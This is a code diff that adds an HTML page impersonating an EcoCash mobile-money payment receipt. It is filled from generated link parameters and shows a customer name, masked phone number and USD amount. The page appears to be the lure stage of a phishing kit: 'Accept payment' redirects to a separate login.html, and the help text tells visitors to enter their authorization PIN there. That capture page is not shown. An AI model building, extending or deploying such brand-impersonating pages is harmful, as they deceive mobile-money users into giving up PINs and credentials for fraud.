@@ -1,0 +1,886 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>EcoCash · Payment Receipt</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500;600&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --eco-blue: #0045A0;
+    --eco-blue-light: #EBF2FA;
+    --eco-red: #E31B23;
+    --eco-green: #00A651;
+    --eco-green-hover: #008f45;
+    --eco-text-main: #111827;
+    --eco-text-muted: #6B7280;
+    --eco-text-subtle: #9CA3AF;
+    --eco-bg: #F3F6FA;
+    --eco-card-bg: #FFFFFF;
+    --eco-border: #E5E9F0;
+    --eco-border-light: #F1F4F8;
+    --eco-avatar-bg: #E8F0FA;
+    --eco-avatar-text: #0045A0;
+    --eco-radius-card: 24px;
+    --eco-radius-box: 16px;
+    --eco-radius-btn: 12px;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+
+  html, body {
+    min-height: 100%;
+    background-color: var(--eco-bg);
+    font-family: 'Poppins', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    color: var(--eco-text-main);
+    -webkit-font-smoothing: antialiased;
+  }
+
+  /* Responsive App Container: Phone-optimized layout */
+  .app-layout {
+    width: 100%;
+    max-width: 480px;
+    margin: 0 auto;
+    min-height: 100vh;
+    padding: 16px 14px 36px;
+    display: flex;
+    flex-direction: column;
+    gap: 14px;
+  }
+
+  /* 1. Header with EcoCash Logo & Help Pill */
+  .brand-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 6px 4px;
+  }
+
+  .logo-link {
+    display: flex;
+    align-items: baseline;
+    font-size: 26px;
+    font-weight: 800;
+    letter-spacing: -0.5px;
+    text-decoration: none;
+    line-height: 1;
+  }
+
+  .logo-eco { color: var(--eco-blue); }
+  .logo-cash { color: var(--eco-red); margin-left: 1px; }
+
+  .btn-header-help {
+    display: inline-flex;
+    align-items: center;
+    gap: 7px;
+    padding: 8px 16px;
+    background: #FFFFFF;
+    border: 1.5px solid var(--eco-border);
+    border-radius: 24px;
+    color: var(--eco-blue);
+    font-size: 13.5px;
+    font-weight: 700;
+    font-family: inherit;
+    cursor: pointer;
+    box-shadow: 0 1px 3px rgba(0,0,0,0.03);
+    transition: background-color 0.15s, border-color 0.15s;
+  }
+
+  .btn-header-help:hover { background: #F8FAFD; border-color: var(--eco-blue); }
+  .btn-header-help:active { transform: scale(0.97); }
+
+  .help-icon-circle {
+    width: 20px;
+    height: 20px;
+    border-radius: 50%;
+    background: var(--eco-blue);
+    color: #FFFFFF;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 12px;
+    font-weight: 800;
+  }
+
+  /* 2. Top Action Buttons: Copy Receipt & Print */
+  .action-row {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+  }
+
+  .btn-action {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    padding: 13px 14px;
+    border-radius: var(--eco-radius-btn);
+    font-size: 14px;
+    font-weight: 700;
+    font-family: inherit;
+    cursor: pointer;
+    transition: all 0.15s ease;
+  }
+
+  .btn-action:active { transform: scale(0.98); }
+
+  .btn-copy-receipt {
+    background: #FFFFFF;
+    color: var(--eco-blue);
+    border: 1.5px solid var(--eco-border);
+    box-shadow: 0 2px 6px rgba(0,0,0,0.03);
+  }
+
+  .btn-copy-receipt:hover {
+    background: #F8FAFD;
+    border-color: var(--eco-blue);
+  }
+
+  .btn-print {
+    background: var(--eco-blue);
+    color: #FFFFFF;
+    border: 1.5px solid var(--eco-blue);
+    box-shadow: 0 4px 12px rgba(0,69,160,0.18);
+  }
+
+  .btn-print:hover { filter: brightness(1.08); }
+
+  /* 3. Main White Payment Receipt Card */
+  .receipt-card {
+    background: var(--eco-card-bg);
+    border-radius: var(--eco-radius-card);
+    border: 1px solid var(--eco-border);
+    box-shadow: 0 10px 32px rgba(0,69,160,0.05);
+    padding: 22px 20px 24px;
+    display: flex;
+    flex-direction: column;
+    gap: 18px;
+  }
+
+  /* Card Header: ↗  Payment Receipt  ? */
+  .card-topbar {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding-bottom: 4px;
+  }
+
+  .card-icon-btn {
+    width: 38px;
+    height: 38px;
+    border-radius: 12px;
+    border: 1px solid var(--eco-border);
+    background: #FFFFFF;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    color: var(--eco-text-muted);
+    font-size: 15px;
+    font-weight: 700;
+    transition: all 0.15s ease;
+  }
+
+  .card-icon-btn:hover { border-color: var(--eco-blue); color: var(--eco-blue); background: var(--eco-blue-light); }
+  .card-icon-btn:active { transform: scale(0.95); }
+
+  .card-header-title {
+    font-size: 17px;
+    font-weight: 700;
+    letter-spacing: -0.3px;
+    color: var(--eco-text-main);
+  }
+
+  /* Checkmark Badge with Soft Halo */
+  .status-hero {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    text-align: center;
+    padding: 4px 0 2px;
+  }
+
+  .checkmark-ring {
+    width: 78px;
+    height: 78px;
+    border-radius: 50%;
+    background: #E8F1FC;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-bottom: 16px;
+    box-shadow: 0 0 0 8px #F2F7FD;
+  }
+
+  .checkmark-core {
+    width: 58px;
+    height: 58px;
+    border-radius: 50%;
+    background: var(--eco-blue);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #FFFFFF;
+    font-size: 26px;
+    font-weight: 800;
+  }
+
+  .status-heading {
+    font-size: 21px;
+    font-weight: 800;
+    letter-spacing: -0.4px;
+    color: var(--eco-text-main);
+    margin-bottom: 6px;
+  }
+
+  .status-subtitle {
+    font-size: 13.5px;
+    color: var(--eco-text-muted);
+    line-height: 1.45;
+    max-width: 330px;
+    margin-bottom: 10px;
+  }
+
+  .txn-meta-line {
+    font-size: 12.5px;
+    color: var(--eco-text-muted);
+    font-weight: 500;
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+  }
+
+  .txn-id-mono {
+    font-family: 'JetBrains Mono', "SF Mono", monospace;
+    font-weight: 600;
+    color: var(--eco-text-main);
+  }
+
+  /* 4. Amount to Pay Box with Green Accept Button */
+  .amount-box {
+    background: #FFFFFF;
+    border: 1.5px solid var(--eco-border);
+    border-radius: var(--eco-radius-box);
+    padding: 16px 18px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 12px;
+  }
+
+  .amount-left {
+    display: flex;
+    flex-direction: column;
+    gap: 2px;
+  }
+
+  .amount-label {
+    font-size: 11px;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.6px;
+    color: var(--eco-text-muted);
+  }
+
+  .amount-display {
+    font-size: 24px;
+    font-weight: 800;
+    letter-spacing: -0.6px;
+    color: var(--eco-text-main);
+    display: flex;
+    align-items: baseline;
+    gap: 6px;
+  }
+
+  .amount-cur {
+    font-size: 16px;
+    font-weight: 800;
+    color: var(--eco-blue);
+  }
+
+  .btn-accept {
+    background: var(--eco-green);
+    color: #FFFFFF;
+    border: none;
+    border-radius: 10px;
+    padding: 12px 20px;
+    font-size: 14px;
+    font-weight: 700;
+    font-family: inherit;
+    cursor: pointer;
+    box-shadow: 0 4px 12px rgba(0,166,81,0.25);
+    white-space: nowrap;
+    transition: background-color 0.15s, transform 0.1s;
+    text-decoration: none;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .btn-accept:hover { background: var(--eco-green-hover); }
+  .btn-accept:active { transform: scale(0.97); }
+
+  /* 5. Details Rows: Customer, From (Bank Transfer), Service, Payment Method */
+  .details-list {
+    display: flex;
+    flex-direction: column;
+    padding-top: 4px;
+  }
+
+  .detail-row {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    padding: 14px 2px;
+  }
+
+  .detail-divider {
+    height: 1px;
+    background: var(--eco-border-light);
+    margin: 0;
+  }
+
+  .avatar-circle {
+    width: 44px;
+    height: 44px;
+    border-radius: 50%;
+    background: var(--eco-avatar-bg);
+    color: var(--eco-avatar-text);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 14px;
+    font-weight: 800;
+    flex-shrink: 0;
+    letter-spacing: 0.5px;
+  }
+
+  .detail-info {
+    display: flex;
+    flex-direction: column;
+    gap: 2px;
+    flex: 1;
+    min-width: 0;
+  }
+
+  .detail-label {
+    font-size: 11px;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.6px;
+    color: var(--eco-text-muted);
+  }
+
+  .detail-title {
+    font-size: 14.5px;
+    font-weight: 700;
+    color: var(--eco-text-main);
+    letter-spacing: 0.2px;
+    word-break: break-word;
+  }
+
+  .detail-sub {
+    font-size: 13px;
+    color: var(--eco-text-muted);
+    font-family: 'JetBrains Mono', "SF Mono", monospace;
+    letter-spacing: 0.3px;
+  }
+
+  /* Note Box */
+  .note-pill {
+    background: #F8FAFD;
+    border-left: 3px solid var(--eco-blue);
+    padding: 10px 14px;
+    border-radius: 6px;
+    font-size: 12.5px;
+    color: var(--eco-text-main);
+    line-height: 1.5;
+    margin-top: 10px;
+  }
+
+  /* Toast Notification */
+  .toast {
+    position: fixed;
+    bottom: 24px;
+    left: 50%;
+    transform: translateX(-50%) translateY(70px);
+    background: #111827;
+    color: #FFFFFF;
+    padding: 12px 22px;
+    border-radius: 12px;
+    font-size: 13px;
+    font-weight: 600;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.25);
+    opacity: 0;
+    transition: all 0.25s ease;
+    z-index: 2000;
+    pointer-events: none;
+  }
+
+  .toast.show {
+    opacity: 1;
+    transform: translateX(-50%) translateY(0);
+  }
+
+  /* Modal / Action Sheet */
+  .modal-overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(17,24,39,0.6);
+    backdrop-filter: blur(3px);
+    z-index: 1000;
+    display: flex;
+    align-items: flex-end;
+    justify-content: center;
+    opacity: 0;
+    pointer-events: none;
+    transition: opacity 0.2s ease;
+  }
+
+  .modal-overlay.active { opacity: 1; pointer-events: auto; }
+
+  .modal-sheet {
+    background: #FFFFFF;
+    width: 100%;
+    max-width: 480px;
+    border-radius: 24px 24px 0 0;
+    padding: 22px 20px 32px;
+    transform: translateY(100%);
+    transition: transform 0.25s cubic-bezier(0.16, 1, 0.3, 1);
+  }
+
+  .modal-overlay.active .modal-sheet { transform: translateY(0); }
+
+  .sheet-title {
+    font-size: 17px;
+    font-weight: 800;
+    margin-bottom: 6px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+
+  .sheet-body {
+    font-size: 13.5px;
+    color: var(--eco-text-muted);
+    line-height: 1.5;
+    margin-bottom: 18px;
+  }
+
+  .btn-sheet-close {
+    width: 100%;
+    padding: 12px;
+    border: none;
+    border-radius: 10px;
+    background: #F1F4F8;
+    color: var(--eco-text-main);
+    font-size: 14px;
+    font-weight: 700;
+    font-family: inherit;
+    cursor: pointer;
+  }
+
+  /* Responsive Mobile Tweaks */
+  @media (max-width: 480px) {
+    .app-layout {
+      padding: 12px 10px 28px;
+      gap: 12px;
+    }
+    .receipt-card {
+      padding: 18px 16px 20px;
+      border-radius: 20px;
+    }
+    .amount-box {
+      padding: 14px 14px;
+    }
+    .amount-display {
+      font-size: 22px;
+    }
+    .btn-accept {
+      padding: 11px 16px;
+      font-size: 13.5px;
+    }
+  }
+
+  /* Print Styles */
+  @media print {
+    body { background: #FFFFFF !important; }
+    .btn-header-help, .action-row, .card-icon-btn, .btn-accept { display: none !important; }
+    .receipt-card { border: none !important; box-shadow: none !important; padding: 0 !important; }
+    .app-layout { padding: 0 !important; max-width: 100% !important; }
+  }
+</style>
+</head>
+<body>
+
+<div class="app-layout">
+
+  <!-- 1. Top Header: EcoCash Brand & Help Button -->
+  <header class="brand-header">
+    <a href="/" class="logo-link">
+      <span class="logo-eco">Eco</span><span class="logo-cash">Cash</span>
+    </a>
+    <button type="button" class="btn-header-help" onclick="openHelpModal()">
+      <span class="help-icon-circle">?</span>
+      <span>Help</span>
+    </button>
+  </header>
+
+  <!-- 2. Action Row: Copy Receipt & Print Buttons -->
+  <div class="action-row">
+    <button type="button" class="btn-action btn-copy-receipt" onclick="copyReceiptText()">
+      <span>📋</span>
+      <span>Copy Receipt</span>
+    </button>
+    <button type="button" class="btn-action btn-print" onclick="window.print()">
+      <span>🖨️</span>
+      <span>Print</span>
+    </button>
+  </div>
+
+  <!-- 3. Main Payment Receipt Card -->
+  <main class="receipt-card">
+
+    <!-- Top bar inside card: ↗ Payment Receipt ? -->
+    <div class="card-topbar">
+      <button type="button" class="card-icon-btn" onclick="handleShare()" title="Share">
+        <span>↗</span>
+      </button>
+      <div class="card-header-title">Payment Receipt</div>
+      <button type="button" class="card-icon-btn" onclick="openHelpModal()" title="Help">
+        <span>?</span>
+      </button>
+    </div>
+
+    <!-- Status Hero: Blue Halo Checkmark Badge -->
+    <div class="status-hero">
+      <div class="checkmark-ring">
+        <div class="checkmark-core">✓</div>
+      </div>
+      <h1 class="status-heading" id="statusHeading">Payment Request Received</h1>
+      <p class="status-subtitle">
+        Please review the details below and confirm the payment.
+      </p>
+      <div class="txn-meta-line">
+        <span>Transaction <span class="txn-id-mono" id="dispTxn">TXN-VRQNU6YZ</span></span>
+        <span>·</span>
+        <span id="dispDate">Oct 31, 2026, 06:42 PM</span>
+      </div>
+    </div>
+
+    <!-- Amount to Pay Box with Accept Payment Button -->
+    <div class="amount-box">
+      <div class="amount-left">
+        <div class="amount-label">AMOUNT TO PAY</div>
+        <div class="amount-display">
+          <span class="amount-cur" id="dispCur">USD</span>
+          <span id="dispAmt">200.00</span>
+        </div>
+      </div>
+      <button type="button" class="btn-accept" id="acceptBtn" onclick="acceptPayment()">
+        Accept payment
+      </button>
+    </div>
+
+    <!-- Details Breakdown: Customer, From (Bank Transfer), Service, Payment Method -->
+    <div class="details-list">
+
+      <!-- Customer Row -->
+      <div class="detail-row">
+        <div class="avatar-circle" id="customerAvatar">KD</div>
+        <div class="detail-info">
+          <div class="detail-label">CUSTOMER</div>
+          <div class="detail-title" id="dispCustomer">KEABETSOE DUBE</div>
+          <div class="detail-sub" id="dispCustAccount">077 ••• 822</div>
+        </div>
+      </div>
+
+      <div class="detail-divider"></div>
+
+      <!-- From Row: Replaced with Bank Transfer -->
+      <div class="detail-row">
+        <div class="avatar-circle" style="background:#EBF2FA; color:#0045A0;">🏦</div>
+        <div class="detail-info">
+          <div class="detail-label">FROM</div>
+          <div class="detail-title" id="dispFromTitle">Bank Transfer</div>
+          <div class="detail-sub" id="dispFromSub">Transfer Reference · <span id="dispTracking">EC83K19D</span></div>
+        </div>
+      </div>
+
+      <div class="detail-divider"></div>
+
+      <!-- Service Row -->
+      <div class="detail-row" id="serviceRowSection">
+        <div class="avatar-circle" style="background:#F0FDF4; color:#00A651;">📑</div>
+        <div class="detail-info">
+          <div class="detail-label">SERVICE</div>
+          <div class="detail-title" id="dispService">Consulting Services</div>
+          <div class="detail-sub" id="dispMarket">Zimbabwe Urban</div>
+        </div>
+      </div>
+
+      <div class="detail-divider"></div>
+
+      <!-- Payment Method Row -->
+      <div class="detail-row" id="methodRowSection">
+        <div class="avatar-circle" style="background:#FEF3C7; color:#B45309;">💳</div>
+        <div class="detail-info">
+          <div class="detail-label">PAYMENT METHOD</div>
+          <div class="detail-title" id="dispMethod">EcoCash Wallet Transfer</div>
+          <div class="detail-sub" id="dispCountry">Zimbabwe</div>
+        </div>
+      </div>
+
+      <!-- Receipt Note Box (if provided) -->
+      <div id="noteBoxWrap" style="display:none;">
+        <div class="note-pill" id="dispNoteText"></div>
+      </div>
+
+    </div>
+
+  </main>
+
+</div>
+
+<!-- Help Modal -->
+<div class="modal-overlay" id="helpModal">
+  <div class="modal-sheet">
+    <div class="sheet-title">
+      <span>EcoCash Payment Help</span>
+      <span style="font-size:16px; cursor:pointer;" onclick="closeHelpModal()">✕</span>
+    </div>
+    <div class="sheet-body">
+      <p style="margin-bottom:10px;"><strong>What does this receipt mean?</strong><br>
+      This is a formal payment request from the merchant. To finalize your transaction, click <em>Accept payment</em> to continue.</p>
+      
+      <p style="margin-bottom:10px;"><strong>How to confirm:</strong><br>
+      A confirmation prompt will authenticate your payment session. Enter your authorization PIN when prompted to complete the transfer.</p>
+
+      <p><strong>Need assistance?</strong><br>
+      Please reach out directly to your service provider or merchant administrator.</p>
+    </div>
+    <button type="button" class="btn-sheet-close" onclick="closeHelpModal()">Close</button>
+  </div>
+</div>
+
+<!-- Toast Notice -->
+<div class="toast" id="toast"></div>
+
+<script>
+let requestData = null;
+
+const $ = id => document.getElementById(id);
+
+function showToast(msg) {
+  const t = $('toast');
+  t.textContent = msg;
+  t.classList.add('show');
+  clearTimeout(t._timer);
+  t._timer = setTimeout(() => t.classList.remove('show'), 2200);
+}
+
+// Generate initials (e.g. KEABETSOE DUBE -> KD)
+function getInitials(name) {
+  if (!name) return 'KD';
+  const parts = name.trim().split(/\s+/);
+  if (parts.length === 1) return parts[0].slice(0, 2).toUpperCase();
+  return (parts[0][0] + parts[parts.length - 1][0]).toUpperCase();
+}
+
+// Mask middle digits: 0771234822 -> 077 ••• 822
+function maskPhone(num) {
+  if (!num) return '077 ••• 822';
+  const clean = String(num).replace(/\s+/g, '');
+  if (clean.length <= 6) return clean;
+  const start = clean.slice(0, 3);
+  const end = clean.slice(-3);
+  return `${start} ••• ${end}`;
+}
+
+// Format date timestamp
+function formatTxnDate(timestamp) {
+  const d = timestamp ? new Date(timestamp) : new Date();
+  return d.toLocaleString('en-US', {
+    month: 'short',
+    day: '2-digit',
+    year: 'numeric',
+    hour: '2-digit',
+    minute: '2-digit',
+    hour12: true
+  });
+}
+
+// Base64URL decoder
+function b64urlDecode(str) {
+  try {
+    str = str.replace(/-/g, '+').replace(/_/g, '/');
+    while (str.length % 4) str += '=';
+    return decodeURIComponent(escape(atob(str)));
+  } catch (e) {
+    return null;
+  }
+}
+
+// Load request data from server API or URL query
+async function loadRequest() {
+  const params = new URLSearchParams(window.location.search);
+  const code = params.get('r');
+  const encoded = params.get('d');
+  const id = params.get('id');
+
+  if (code || id) {
+    const key = code || id;
+    try {
+      const res = await fetch(`/api/links/${encodeURIComponent(key)}`);
+      if (res.ok) {
+        requestData = await res.json();
+        renderPage(requestData);
+        return;
+      }
+    } catch (e) {
+      console.warn('API lookup failed, falling back to URL payload');
+    }
+  }
+
+  if (encoded) {
+    const raw = b64urlDecode(encoded);
+    if (raw) {
+      try {
+        requestData = JSON.parse(raw);
+        renderPage(requestData);
+        return;
+      } catch (e) {}
+    }
+  }
+
+  // Fallback demo state
+  renderPage({
+    rn: 'KEABETSOE DUBE',
+    an: '0771234822',
+    am: '200.00',
+    cur: 'USD',
+    tx: 'TXN-VRQNU6YZ',
+    tn: 'EC83K19D',
+    pm: 'EcoCash Wallet Transfer',
+    sn: 'Consulting Services',
+    mk: 'Zimbabwe Urban',
+    c: 'Zimbabwe',
+    dt: Date.now()
+  });
+}
+
+function renderPage(data) {
+  if (!data) return;
+
+  // Header meta & Amount
+  $('dispTxn').textContent = data.tx || 'TXN-VRQNU6YZ';
+  $('dispDate').textContent = formatTxnDate(data.dt);
+  $('dispCur').textContent = data.cur || 'USD';
+  $('dispAmt').textContent = data.am ? Number(data.am).toFixed(2) : '200.00';
+
+  // Customer row (recipient / customer name)
+  const custName = data.rn || 'KEABETSOE DUBE';
+  $('dispCustomer').textContent = custName.toUpperCase();
+  $('customerAvatar').textContent = getInitials(custName);
+  $('dispCustAccount').textContent = maskPhone(data.an || '0771234822');
+
+  // From row: Replaced with Bank Transfer as requested
+  $('dispFromTitle').textContent = 'Bank Transfer';
+  $('dispTracking').textContent = data.tn || 'EC83K19D';
+
+  // Service row: As set when generating link
+  $('dispService').textContent = data.sn || 'Consulting Services';
+  $('dispMarket').textContent = data.mk || (data.c ? `${data.c} Urban` : 'Standard');
+
+  // Payment Method row: As set when generating link
+  $('dispMethod').textContent = data.pm || 'EcoCash Wallet Transfer';
+  $('dispCountry').textContent = data.c || 'Zimbabwe';
+
+  // Note
+  if (data.nt && data.nt.trim()) {
+    $('dispNoteText').textContent = data.nt;
+    $('noteBoxWrap').style.display = 'block';
+  } else {
+    $('noteBoxWrap').style.display = 'none';
+  }
+}
+
+// Navigation: Accept payment navigates to login.html preserving query parameters
+function acceptPayment() {
+  const currentParams = window.location.search || '';
+  window.location.href = 'login.html' + currentParams;
+}
+
+// Action: Copy Receipt
+function copyReceiptText() {
+  const txn = $('dispTxn').textContent;
+  const date = $('dispDate').textContent;
+  const amt = $('dispAmt').textContent;
+  const cur = $('dispCur').textContent;
+  const cust = $('dispCustomer').textContent;
+  const acc = $('dispCustAccount').textContent;
+  const service = $('dispService').textContent;
+  const method = $('dispMethod').textContent;
+
+  const text = `--- EcoCash Payment Receipt ---
+Status: Payment Request Received
+Transaction: ${txn}
+Date: ${date}
+Amount: ${cur} ${amt}
+Customer: ${cust}
+Account: ${acc}
+From: Bank Transfer
+Service: ${service}
+Payment Method: ${method}
+Payment Link: ${window.location.href}`;
+
+  if (navigator.clipboard && navigator.clipboard.writeText) {
+    navigator.clipboard.writeText(text).then(() => {
+      showToast('✓ Receipt copied to clipboard');
+    }).catch(() => fallbackCopy(text));
+  } else {
+    fallbackCopy(text);
+  }
+}
+
+function fallbackCopy(text) {
+  const ta = document.createElement('textarea');
+  ta.value = text;
+  ta.style.position = 'fixed';
+  ta.style.opacity = '0';
+  document.body.appendChild(ta);
+  ta.select();
+  document.execCommand('copy');
+  document.body.removeChild(ta);
+  showToast('✓ Receipt copied to clipboard');
+}
+
+// Action: Share
+function handleShare() {
+  const url = window.location.href;
+  const title = 'EcoCash Payment Receipt';
+  const text = `EcoCash Payment Request for ${$('dispCur').textContent} ${$('dispAmt').textContent} (${$('dispTxn').textContent}):`;
+
+  if (navigator.share) {
+    navigator.share({ title, text, url }).catch(() => {});
+  } else {
+    copyReceiptText();
+  }
+}
+
+function openHelpModal() { $('helpModal').classList.add('active'); }
+function closeHelpModal() { $('helpModal').classList.remove('active'); }
+
+window.addEventListener('click', e => {
+  if (e.target === $('helpModal')) closeHelpModal();
+});
+
+document.addEventListener('DOMContentLoaded', loadRequest);
+</script>
+</body>
+</html>
